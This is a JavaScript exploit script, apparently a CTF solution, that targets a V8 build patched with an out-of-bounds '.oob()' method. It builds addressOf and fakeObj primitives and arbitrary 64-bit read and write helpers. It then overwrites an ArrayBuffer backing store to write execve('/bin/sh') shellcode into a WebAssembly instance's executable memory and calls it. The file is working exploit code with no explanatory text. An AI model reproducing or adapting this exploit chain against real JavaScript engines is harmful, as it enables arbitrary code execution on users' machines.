var double_array = [1.1];
var obj = {"a" : 1};
var obj_array = [obj];
var double_array_map = double_array.oob();
var obj_array_map = obj_array.oob();


var wasmCode = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11]);
var wasmModule = new WebAssembly.Module(wasmCode);
var wasmInstance = new WebAssembly.Instance(wasmModule, {});
var f = wasmInstance.exports.main;



var read_array = [obj];

function addressOf(o){
    obj_array[0] = o;
    obj_array.oob(double_array_map);
    var address = ftoi(obj_array[0]) - 0x1n;
    obj_array.oob(obj_array_map);
    return address;
}


var f64 = new Float64Array(1);
var bigUint64 = new BigUint64Array(f64.buffer);

function ftoi(f)
{
    f64[0] = f;
    return bigUint64[0];
}

function itof(i)
{
    bigUint64[0] = i;
    return f64[0];
}
function hex(i)
{
    return i.toString(16).padStart(8, "0");
}

function fakeObj(addr){
    // fake obj--------------------------------------
    double_array[0] = itof(addr + 0x30n + 1n);
    double_array.oob(obj_array_map);

    var fake_obj_array = double_array[0];
    double_array.oob(double_array_map);
    return fake_obj_array;
    // fake obj--------------------------------------
}

function write64(fake_array,offset1,fake_obj_array,offset2,addr,data){
    console.log("[*]addr:0x"+hex(addr)+" data:0x"+hex(data));
    // %SystemBreak();
    fake_array[offset1] = itof(addr - 0x10n + 0x1n);
    // %SystemBreak();
    fake_obj_array[offset2] = itof(data);
    // %SystemBreak();

}

function read64(fake_array,offset1,fake_obj_array,offset2,addr){
    console.log("[*] addr:0x"+hex(addr));
    // %DebugPrint(fake_array);
    // %DebugPrint(fake_obj_array);
    // %SystemBreak();
    fake_array[offset1] = itof(addr - 0x10n + 0x1n);
    // %SystemBreak();
    // var result = fake_obj_array[offset2];
    
    console.log("[*] result:0x"+hex(ftoi(fake_obj_array[offset2])));
    return ftoi(fake_obj_array[offset2]);
}



var fake_array = [
    double_array_map,
    itof(0n),
    itof(0x41414141n),
    itof(0x100000000n)
];


fake_array_address = addressOf(fake_array);


console.log("[*] fake array address:0x"+hex(fake_array_address));

fake_obj_array = fakeObj(fake_array_address);

wasmInstance_addr = addressOf(wasmInstance);


// copy to wasm

var shellcode = [
    0x2fbb485299583b6an,
    0x5368732f6e69622fn,
    0x050f5e5457525f54n
  ];

var data_buf = new ArrayBuffer(shellcode.length * 8);
var data_view = new DataView(data_buf);
var data_buf_address = addressOf(data_buf);
var buf_backing_store_addr = data_buf_address + 0x20n;
var wasmInstance_backing_store_addr = read64(fake_array,2,fake_obj_array,0,wasmInstance_addr + 0x88n);
console.log("[*] data_buf address:0x" + hex(data_buf_address))
console.log("[*] backing store addr:0x" + hex(buf_backing_store_addr));
console.log("[*] wasmInstance_addr:0x" + hex(wasmInstance_addr));
console.log("[*] wasmInstance_backing_store_addr:0x" + hex(wasmInstance_backing_store_addr));

// %SystemBreak();

write64(fake_array,2,fake_obj_array,0,buf_backing_store_addr,wasmInstance_backing_store_addr);


// %SystemBreak();
for (let i = 0; i < shellcode.length; ++i)
  data_view.setFloat64(i * 8, itof(shellcode[i]), true);
f();



